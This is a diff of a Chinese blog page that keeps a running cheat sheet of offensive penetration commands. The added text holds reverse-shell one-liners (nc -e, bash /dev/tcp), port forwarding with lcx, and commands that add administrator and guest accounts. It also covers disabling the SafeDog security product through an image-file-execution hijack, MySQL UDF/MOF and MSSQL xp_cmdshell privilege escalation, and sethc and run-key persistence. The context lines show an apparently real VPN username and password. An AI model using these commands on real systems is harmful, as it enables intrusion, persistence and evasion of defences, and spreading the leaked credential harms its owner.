@@ -93,7 +93,7 @@
 <meta property="og:site_name" content="MaiKeFee|">
 <meta property="og:description" content="Linux Linux反弹shell后，方便的交互：python -c &amp;apos;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;apos;无python时：expect -c &amp;apos;spawn bash;interact&amp;apos;无wget nc等下载工具时下载文件exec 5&amp;lt;&amp;gt;/dev/tcp/sec-lab.org/80 &amp;a">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-05T03:43:16.665Z">
+<meta property="og:updated_time" content="2019-09-08T14:46:08.368Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Commands 搜集(持续更新)">
 <meta name="twitter:description" content="Linux Linux反弹shell后，方便的交互：python -c &amp;apos;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;apos;无python时：expect -c &amp;apos;spawn bash;interact&amp;apos;无wget nc等下载工具时下载文件exec 5&amp;lt;&amp;gt;/dev/tcp/sec-lab.org/80 &amp;a">
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-05T11:43:16+08:00">
-                2019-09-05
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-08T22:46:08+08:00">
+                2019-09-08
               </time>
             
           </span>
@@ -451,7 +451,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.3k
+                  2.8k
                 </span>
               
 
@@ -467,7 +467,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  7
+                  14
                 </span>
               
             </div>
@@ -564,7 +564,98 @@ sc qc [service_name] (to verify!)
 net start [service_name]
 CMD
 
-%ProgramData:~0,1%%ProgramData:~9,2% /c echo</code></pre><h4 id="命令行下载"><a href="#命令行下载" class="headerlink" title="命令行下载"></a>命令行下载</h4><pre><code>certutil -urlcache -split -f example.com/file</code></pre><h3 id="命令行下连接VPN-win"><a href="#命令行下连接VPN-win" class="headerlink" title="命令行下连接VPN(win):"></a>命令行下连接VPN(win):</h3><pre><code>rasdial &quot;VPN Connection&quot; zhaodg oZ7iFk25</code></pre><h3 id="命令行关闭VPN连接-win"><a href="#命令行关闭VPN连接-win" class="headerlink" title="命令行关闭VPN连接(win):"></a>命令行关闭VPN连接(win):</h3><pre><code>rasphone -h &quot;VPN Connection&quot;</code></pre><h3 id="通过pptpsetup-Linux"><a href="#通过pptpsetup-Linux" class="headerlink" title="通过pptpsetup(Linux):"></a>通过pptpsetup(Linux):</h3><pre><code>pptpsetup --create vpn --server 5x.xxx.xxx.xx2 --username zhaodg --password oZ7iFk25 --encrypt --start</code></pre><h3 id="注册表运行程序-用来整蛊挺好玩"><a href="#注册表运行程序-用来整蛊挺好玩" class="headerlink" title="注册表运行程序(用来整蛊挺好玩):"></a>注册表运行程序(用来整蛊挺好玩):</h3><pre><code>reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d &quot;cmd.exe /c cmd.exe&quot; /f &amp;&amp; reg add HKCU\Software\Classes\Folder\shell\open\command /v &quot;DelegateExecute&quot; /f  </code></pre><h4 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令:"></a>删除命令:</h4><pre><code>reg delete &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /f</code></pre>
+%ProgramData:~0,1%%ProgramData:~9,2% /c echo</code></pre><h4 id="命令行下载"><a href="#命令行下载" class="headerlink" title="命令行下载"></a>命令行下载</h4><pre><code>certutil -urlcache -split -f example.com/file</code></pre><h3 id="命令行下连接VPN-win"><a href="#命令行下连接VPN-win" class="headerlink" title="命令行下连接VPN(win):"></a>命令行下连接VPN(win):</h3><pre><code>rasdial &quot;VPN Connection&quot; zhaodg oZ7iFk25</code></pre><h3 id="命令行关闭VPN连接-win"><a href="#命令行关闭VPN连接-win" class="headerlink" title="命令行关闭VPN连接(win):"></a>命令行关闭VPN连接(win):</h3><pre><code>rasphone -h &quot;VPN Connection&quot;</code></pre><h3 id="通过pptpsetup-Linux"><a href="#通过pptpsetup-Linux" class="headerlink" title="通过pptpsetup(Linux):"></a>通过pptpsetup(Linux):</h3><pre><code>pptpsetup --create vpn --server 5x.xxx.xxx.xx2 --username zhaodg --password oZ7iFk25 --encrypt --start</code></pre><h3 id="注册表运行程序-用来整蛊挺好玩"><a href="#注册表运行程序-用来整蛊挺好玩" class="headerlink" title="注册表运行程序(用来整蛊挺好玩):"></a>注册表运行程序(用来整蛊挺好玩):</h3><pre><code>reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d &quot;cmd.exe /c cmd.exe&quot; /f &amp;&amp; reg add HKCU\Software\Classes\Folder\shell\open\command /v &quot;DelegateExecute&quot; /f  </code></pre><h4 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令:"></a>删除命令:</h4><pre><code>reg delete &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /f</code></pre><h4 id="Windows-Server-2019开启远程桌面"><a href="#Windows-Server-2019开启远程桌面" class="headerlink" title="Windows Server 2019开启远程桌面"></a>Windows Server 2019开启远程桌面</h4><blockquote>
+<p>默认情况下，Windows Server 2019将外部远程桌面访问设置为禁用作为安全措施，我们可以轻松地从PowerShell中启用它</p>
+</blockquote>
+<blockquote>
+<p>使用PowerShell允许远程桌面</p>
+</blockquote>
+<blockquote>
+<p>我们可以使用Set-ItemPropery cmdlet修改启用或禁用远程桌面的注册表值：</p>
+</blockquote>
+<pre><code>Set-ItemProperty -Path &apos;HKLM:\System\CurrentControlSet\Control\Terminal Server&apos; -name &quot;fDenyTSConnections&quot; -value 0</code></pre><blockquote>
+<p>完成后，使用’Enable-NetFirewallRule’配置Windows防火墙以允许远程桌面连接：<br>Enable-NetFirewallRule -DisplayGroup “Remote Desktop”<br>默认情况下，这将允许所有连接<br>建议尽可能配置更具体的防火墙规则</p>
+</blockquote>
+<h1 id="端口转发类"><a href="#端口转发类" class="headerlink" title="端口转发类"></a>端口转发类</h1><h3 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h3><pre><code>shell： nc -e cmd ip port
+shell: bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1(linux)</code></pre><h3 id="服务器：-nc-vv-lp-port"><a href="#服务器：-nc-vv-lp-port" class="headerlink" title="服务器： nc -vv -lp port"></a>服务器： nc -vv -lp port</h3><h2 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a>端口转发：</h2><pre><code>shell: lcx -slave ip port 127.0.0.1 port</code></pre><h3 id="服务器：-lcx-listen-port-33891"><a href="#服务器：-lcx-listen-port-33891" class="headerlink" title="服务器： lcx -listen port 33891"></a>服务器： lcx -listen port 33891</h3><pre><code>ANTIFW.exe -s #运行程序，将3389转发到80
+ANTIFW.exe -l #关闭程序，恢复</code></pre><h1 id="cmd探查"><a href="#cmd探查" class="headerlink" title="cmd探查"></a>cmd探查</h1><h2 id="信息探测类"><a href="#信息探测类" class="headerlink" title="信息探测类"></a>信息探测类</h2><pre><code>systeminfo ：查看系统版本信息
+
+netstat -ano : 查看系统开放端口
+
+tasklist /svc : 查看系统进程
+
+ipconfig : 查看ip地址
+
+whoami : 查看当前用户
+
+net user : 查看计算机用户列表
+
+net localgroup : 查看计算机用户组列表</code></pre><h2 id="添加用户类"><a href="#添加用户类" class="headerlink" title="添加用户类"></a>添加用户类</h2><pre><code>net user mstlab mstlab /add : 添加用户并设置密码
+
+net localgroup administrators mstlab /add : 将用户加入管理组
+
+net user guest /active:yes : 激活guest用户
+
+net user guest mstlab : 更改guest用户的密码</code></pre><h1 id="KIll-DOG"><a href="#KIll-DOG" class="headerlink" title="KIll DOG:"></a>KIll DOG:</h1><pre><code>Kill Dog：</code></pre><h3 id="1-安全狗默认只拦截加管理组，不拦截加用户"><a href="#1-安全狗默认只拦截加管理组，不拦截加用户" class="headerlink" title="1.安全狗默认只拦截加管理组，不拦截加用户"></a>1.安全狗默认只拦截加管理组，不拦截加用户</h3><p>  法a：利用用户克隆exp：直接克隆administrator的权限<br>  法b：反弹shell读取管理员密码<br>  法c：改注册表替换安全狗的文件，然后重启服务器(redegit /s redegit.reg(redegit.reg见附录))安全狗关闭</p>
+<h3 id="2-安全狗账号防护最严程度：拦截添加用户"><a href="#2-安全狗账号防护最严程度：拦截添加用户" class="headerlink" title="2.安全狗账号防护最严程度：拦截添加用户"></a>2.安全狗账号防护最严程度：拦截添加用户</h3><p>  法a：激活guest，然后克隆用户<br>  法b：反弹shell读取管理员密码<br>  法c：改注册表，重启服务器，关闭安全狗</p>
+<h3 id="redegit-reg脚本内容："><a href="#redegit-reg脚本内容：" class="headerlink" title="redegit.reg脚本内容："></a>redegit.reg脚本内容：</h3><h2 id="Windows-Registry-Editor-Version-5-00"><a href="#Windows-Registry-Editor-Version-5-00" class="headerlink" title="Windows Registry Editor Version 5.00"></a>Windows Registry Editor Version 5.00</h2><pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SafeDogGuardCenter.exe]
+&quot;Debugger&quot;=&quot;C:\WWW\l.php&quot;</code></pre><h1 id="开启的3389方法："><a href="#开启的3389方法：" class="headerlink" title="开启的3389方法："></a>开启的3389方法：</h1><h2 id="1-通用开3389-优化后-："><a href="#1-通用开3389-优化后-：" class="headerlink" title="1.通用开3389(优化后)："></a>1.通用开3389(优化后)：</h2><pre><code>wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 1</code></pre><h2 id="2-For-Win2003"><a href="#2-For-Win2003" class="headerlink" title="2.For Win2003:"></a>2.For Win2003:</h2><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><h2 id="3-For-Win2008"><a href="#3-For-Win2008" class="headerlink" title="3.For Win2008:"></a>3.For Win2008:</h2><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><h2 id="4-For-Every"><a href="#4-For-Every" class="headerlink" title="4.For Every:"></a>4.For Every:</h2><pre><code>cmd开3389 win08 win03 win7 win2012 winxp</code></pre><h2 id="win08，三条命令即可"><a href="#win08，三条命令即可" class="headerlink" title="win08，三条命令即可:"></a>win08，三条命令即可:</h2><pre><code>wmic /namespace:\root\cimv2    erminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1
+wmic /namespace:\root\cimv2    erminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1
+reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre><h2 id="win2012通用；win7前两条即可。权限需要run-as-administrator"><a href="#win2012通用；win7前两条即可。权限需要run-as-administrator" class="headerlink" title="win2012通用；win7前两条即可。权限需要run as administrator"></a>win2012通用；win7前两条即可。权限需要run as administrator</h2><h1 id="查询终端端口-："><a href="#查询终端端口-：" class="headerlink" title="查询终端端口 ："></a>查询终端端口 ：</h1><pre><code>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber
+(or) 终端端口：tasklist /svc查询TermService对应PID和netstat查询的PID对应的端口号
+(or) 注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ Wds dpwd\Tds    cp 中PortNumber的值</code></pre><h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权:"></a>数据库提权:</h1><h2 id="UDF手工提权辅助："><a href="#UDF手工提权辅助：" class="headerlink" title="UDF手工提权辅助："></a>UDF手工提权辅助：</h2><pre><code>select @@basedir;  #查看mysql安装目录
+select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib::&apos;;  #利用NTFS ADS创建lib目录
+select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib\plugin::&apos;;  #利用NTFS ADS创建plugin目录
+select 0xUDFcode into dumpfile &apos;C:\phpstu\MySQL\lib\plugin\mstlab.dll&apos;;  #导出udfcode，注意修改udfcode
+create function cmdshell returns string soname &apos;mstlab.dll&apos;;   #用udf创建cmd函数，shell,sys_exec,sys_eval
+select shell(&apos;cmd&apos;,&apos;net user&apos;);     #执行cmd命令</code></pre><p>show variables like ‘%plugin%’;     #查看plugin路径</p>
+<h3 id="小技巧："><a href="#小技巧：" class="headerlink" title="小技巧："></a>小技巧：</h3><pre><code>1.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中ImagePath的值为mysql安装目录
+2.my.ini中datadir的值是数据存放目录
+3.UPDATE user set File_priv =&apos;Y&apos;;  flush privileges; 强制加file权限</code></pre><h2 id="MOF手工提权辅助："><a href="#MOF手工提权辅助：" class="headerlink" title="MOF手工提权辅助："></a>MOF手工提权辅助：</h2><pre><code>pragma namespace(&quot;\\.\root\subscription&quot;) 
+
+instance of __EventFilter as  
+{ 
+    EventNamespace = &quot;Root\Cimv2&quot;; 
+    Name  = &quot;filtP2&quot;; 
+    Query = &quot;Select * From __InstanceModificationEvent &quot; 
+            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; 
+            &quot;And TargetInstance.Second = 5&quot;; 
+    QueryLanguage = &quot;WQL&quot;; 
+}; 
+
+instance of ActiveScriptEventConsumer as  
+{ 
+    Name = &quot;consPCSV2&quot;; 
+    ScriptingEngine = &quot;JScript&quot;; 
+    ScriptText = 
+    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;) WSH.run(\&quot;net.exe user admintony admin /add&amp;&amp;net.exe localgroup administrators admintony /add\&quot;)&quot;; 
+}; 
+
+instance of __FilterToConsumerBinding 
+{ 
+    Consumer   = ; 
+    Filter = ; 
+}; 
+
+保存为 1.mof
+然后mysql执行：select load_file(&apos;D:/wwwroot/1.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</code></pre><h2 id="SA提权辅助："><a href="#SA提权辅助：" class="headerlink" title="SA提权辅助："></a>SA提权辅助：</h2><h3 id="1-判断扩展存储是否存在："><a href="#1-判断扩展存储是否存在：" class="headerlink" title="1.判断扩展存储是否存在："></a>1.判断扩展存储是否存在：</h3><pre><code>select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; AND name= &apos;xp_cmdshell&apos;
+select count(*) from master.dbo.sysobjects where name=&apos;xp_regread&apos;</code></pre><h2 id="恢复："><a href="#恢复：" class="headerlink" title="恢复："></a>恢复：</h2><pre><code>exec sp_dropextendedproc &apos;xp_cmdshell&apos;
+exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos;
+EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;(SQL2005)</code></pre><h3 id="2-列目录："><a href="#2-列目录：" class="headerlink" title="2.列目录："></a>2.列目录：</h3><pre><code>exec master..xp_cmdshell &apos;ver&apos;
+(or) exec master..xp_dirtree &apos;c:\&apos;,1,1
+(or) drop table black
+create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- 
+insert into black exec master..xp_cmdshell &apos;dir c:\&apos; 
+select top 1 mulu from black where id=1
+xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权</code></pre><h3 id="3-备份启动项："><a href="#3-备份启动项：" class="headerlink" title="3.备份启动项："></a>3.备份启动项：</h3><pre><code>alter database [master] set RECOVERY FULL
+create table cmd (a image)
+backup log [master] to disk = &apos;c:\cmd1&apos; with init
+insert into cmd (a) values (0x(batcode))
+backup log [master] to disk = &apos;C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat&apos;
+drop table cmd</code></pre><h3 id="4-映像劫持"><a href="#4-映像劫持" class="headerlink" title="4.映像劫持"></a>4.映像劫持</h3><pre><code>xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&apos;,&apos;debugger&apos;,&apos;reg_sz&apos;,&apos;c:\windows\system32\cmd.exe&apos;</code></pre><h3 id="5-沙盒模式提权："><a href="#5-沙盒模式提权：" class="headerlink" title="5.沙盒模式提权："></a>5.沙盒模式提权：</h3><h2 id="法a："><a href="#法a：" class="headerlink" title="法a："></a>法a：</h2><pre><code>exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\JET\Engines&apos;,&apos;SandBoxMode&apos;,&apos;REG_DWORD&apos;,0;</code></pre><p>关闭沙盒模式</p>
+<h2 id="法b："><a href="#法b：" class="headerlink" title="法b："></a>法b：</h2><pre><code>Select * From OpenRowSet(&apos;Microsoft.Jet.OLEDB.4.0&apos;,&apos;;Database=c:\windows\system32\ias\ias.mdb&apos;,&apos;select shell(&quot;net user mstlab mstlab /add&quot;)&apos;); #or c:\windows\system32\ias\dnary.mdb string类型用此。
+开启OpenRowSet：exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ad Hoc Distributed Queries&apos;,1;RECONFIGURE;</code></pre><h3 id="6-xp-regwrite操作注册表"><a href="#6-xp-regwrite操作注册表" class="headerlink" title="6.xp_regwrite操作注册表"></a>6.xp_regwrite操作注册表</h3><pre><code>exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows\currentversion un&apos;,&apos;black&apos;,&apos;REG_SZ&apos;,&apos;net user test test /add&apos;
+开启xp_oacreate:exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ole Automation Procedures&apos;,1;RECONFIGURE;</code></pre>
       
     </div>
     
@@ -697,7 +788,7 @@ CMD
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-count">45</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -708,7 +799,7 @@ CMD
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -775,23 +866,23 @@ CMD
         
         
           <li>
-            <a href="/archives/aa15bbdb.html" title="常见古典密码及在线工具" target="_blank">常见古典密码及在线工具</a>
+            <a href="/archives/5302ec6.html" title="MSF后渗透利用整理|MSF命令大全" target="_blank">MSF后渗透利用整理|MSF命令大全</a>
           </li>
         
           <li>
-            <a href="/archives/b18c4253.html" title="一键搭建VPN" target="_blank">一键搭建VPN</a>
+            <a href="/archives/5e06e84c.html" title="Access+Mssql+Mysql 手工注入基本流程" target="_blank">Access+Mssql+Mysql 手工注入基本流程</a>
           </li>
         
           <li>
-            <a href="/archives/23c2d7c0.html" title="linux下通过脚本自动搭建ss" target="_blank">linux下通过脚本自动搭建ss</a>
+            <a href="/archives/7356a0d2.html" title="sqlmap注入之tamper绕过WAF脚本列表" target="_blank">sqlmap注入之tamper绕过WAF脚本列表</a>
           </li>
         
           <li>
-            <a href="/archives/3f60c38c.html" title="PHP常见绕过WAF方法汇总" target="_blank">PHP常见绕过WAF方法汇总</a>
+            <a href="/archives/6defc515.html" title="过安全狗waf注入方法技巧" target="_blank">过安全狗waf注入方法技巧</a>
           </li>
         
           <li>
-            <a href="/archives/67b2bdd.html" title="无关键字进行SQL注入" target="_blank">无关键字进行SQL注入</a>
+            <a href="/archives/d405928.html" title="安全狗绕过" target="_blank">安全狗绕过</a>
           </li>
         
       </ul>
@@ -813,7 +904,7 @@ CMD
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux反弹shell后，方便的交互："><span class="nav-number">1.</span> <span class="nav-text">Linux反弹shell后，方便的交互：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无python时："><span class="nav-number">2.</span> <span class="nav-text">无python时：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无wget-nc等下载工具时下载文件"><span class="nav-number">3.</span> <span class="nav-text">无wget nc等下载工具时下载文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这个要求管理员有su的习惯，我们可以通过它来添加一个id-0的用户"><span class="nav-number">4.</span> <span class="nav-text">这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lsof-命令"><span class="nav-number">5.</span> <span class="nav-text">lsof 命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH端口转发"><span class="nav-number">6.</span> <span class="nav-text">SSH端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#图片马"><span class="nav-number">7.</span> <span class="nav-text">图片马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取无线密码："><span class="nav-number">7.1.</span> <span class="nav-text">获取无线密码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权加账号"><span class="nav-number">7.2.</span> <span class="nav-text">提权加账号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载执行："><span class="nav-number">7.3.</span> <span class="nav-text">下载执行：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#摄像头录像："><span class="nav-number">7.4.</span> <span class="nav-text">摄像头录像：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#录音"><span class="nav-number">7.5.</span> <span class="nav-text">录音:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取vpn密码"><span class="nav-number">7.6.</span> <span class="nav-text">获取vpn密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读取chrome-cookies"><span class="nav-number">7.7.</span> <span class="nav-text">读取chrome cookies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权常用"><span class="nav-number">7.8.</span> <span class="nav-text">提权常用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#命令行下载"><span class="nav-number">7.8.1.</span> <span class="nav-text">命令行下载</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令行下连接VPN-win"><span class="nav-number">7.9.</span> <span class="nav-text">命令行下连接VPN(win):</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令行关闭VPN连接-win"><span class="nav-number">7.10.</span> <span class="nav-text">命令行关闭VPN连接(win):</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过pptpsetup-Linux"><span class="nav-number">7.11.</span> <span class="nav-text">通过pptpsetup(Linux):</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表运行程序-用来整蛊挺好玩"><span class="nav-number">7.12.</span> <span class="nav-text">注册表运行程序(用来整蛊挺好玩):</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#删除命令"><span class="nav-number">7.12.1.</span> <span class="nav-text">删除命令:</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux反弹shell后，方便的交互："><span class="nav-number">1.</span> <span class="nav-text">Linux反弹shell后，方便的交互：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无python时："><span class="nav-number">2.</span> <span class="nav-text">无python时：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无wget-nc等下载工具时下载文件"><span class="nav-number">3.</span> <span class="nav-text">无wget nc等下载工具时下载文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这个要求管理员有su的习惯，我们可以通过它来添加一个id-0的用户"><span class="nav-number">4.</span> <span class="nav-text">这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lsof-命令"><span class="nav-number">5.</span> <span class="nav-text">lsof 命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH端口转发"><span class="nav-number">6.</span> <span class="nav-text">SSH端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#图片马"><span class="nav-number">7.</span> <span class="nav-text">图片马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取无线密码："><span class="nav-number">7.1.</span> <span class="nav-text">获取无线密码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权加账号"><span class="nav-number">7.2.</span> <span class="nav-text">提权加账号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载执行："><span class="nav-number">7.3.</span> <span class="nav-text">下载执行：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#摄像头录像："><span class="nav-number">7.4.</span> <span class="nav-text">摄像头录像：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#录音"><span class="nav-number">7.5.</span> <span class="nav-text">录音:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取vpn密码"><span class="nav-number">7.6.</span> <span class="nav-text">获取vpn密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读取chrome-cookies"><span class="nav-number">7.7.</span> <span class="nav-text">读取chrome cookies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权常用"><span class="nav-number">7.8.</span> <span class="nav-text">提权常用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#命令行下载"><span class="nav-number">7.8.1.</span> <span class="nav-text">命令行下载</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令行下连接VPN-win"><span class="nav-number">7.9.</span> <span class="nav-text">命令行下连接VPN(win):</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令行关闭VPN连接-win"><span class="nav-number">7.10.</span> <span class="nav-text">命令行关闭VPN连接(win):</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过pptpsetup-Linux"><span class="nav-number">7.11.</span> <span class="nav-text">通过pptpsetup(Linux):</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表运行程序-用来整蛊挺好玩"><span class="nav-number">7.12.</span> <span class="nav-text">注册表运行程序(用来整蛊挺好玩):</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#删除命令"><span class="nav-number">7.12.1.</span> <span class="nav-text">删除命令:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-Server-2019开启远程桌面"><span class="nav-number">7.12.2.</span> <span class="nav-text">Windows Server 2019开启远程桌面</span></a></li></ol></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#端口转发类"><span class="nav-number"></span> <span class="nav-text">端口转发类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell："><span class="nav-number">0.1.</span> <span class="nav-text">反弹shell：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务器：-nc-vv-lp-port"><span class="nav-number">0.2.</span> <span class="nav-text">服务器： nc -vv -lp port</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口转发："><span class="nav-number">1.</span> <span class="nav-text">端口转发：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务器：-lcx-listen-port-33891"><span class="nav-number">1.1.</span> <span class="nav-text">服务器： lcx -listen port 33891</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cmd探查"><span class="nav-number"></span> <span class="nav-text">cmd探查</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息探测类"><span class="nav-number">1.</span> <span class="nav-text">信息探测类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#添加用户类"><span class="nav-number">2.</span> <span class="nav-text">添加用户类</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#KIll-DOG"><span class="nav-number"></span> <span class="nav-text">KIll DOG:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-安全狗默认只拦截加管理组，不拦截加用户"><span class="nav-number">0.1.</span> <span class="nav-text">1.安全狗默认只拦截加管理组，不拦截加用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-安全狗账号防护最严程度：拦截添加用户"><span class="nav-number">0.2.</span> <span class="nav-text">2.安全狗账号防护最严程度：拦截添加用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redegit-reg脚本内容："><span class="nav-number">0.3.</span> <span class="nav-text">redegit.reg脚本内容：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-Registry-Editor-Version-5-00"><span class="nav-number">1.</span> <span class="nav-text">Windows Registry Editor Version 5.00</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#开启的3389方法："><span class="nav-number"></span> <span class="nav-text">开启的3389方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-通用开3389-优化后-："><span class="nav-number">1.</span> <span class="nav-text">1.通用开3389(优化后)：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-For-Win2003"><span class="nav-number">2.</span> <span class="nav-text">2.For Win2003:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-For-Win2008"><span class="nav-number">3.</span> <span class="nav-text">3.For Win2008:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-For-Every"><span class="nav-number">4.</span> <span class="nav-text">4.For Every:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#win08，三条命令即可"><span class="nav-number">5.</span> <span 